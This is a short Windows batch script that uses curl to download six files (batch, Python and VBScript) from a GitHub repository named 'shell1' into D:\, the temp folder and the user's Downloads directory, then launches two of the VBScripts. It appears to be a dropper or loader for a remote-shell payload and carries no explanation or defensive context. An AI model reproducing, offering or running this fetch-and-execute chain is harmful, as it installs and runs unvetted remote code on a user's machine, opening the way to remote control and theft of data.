@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/pro.bat -o D:\pro.bat
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb.vbs -o D:\vb.vbs
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.bat -o "%downloads_dir%\post.bat"
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.vbs -o "%downloads_dir%\post.vbs"
start /wait D:\vb.vbs
call "%downloads_dir%\vb1.vbs"

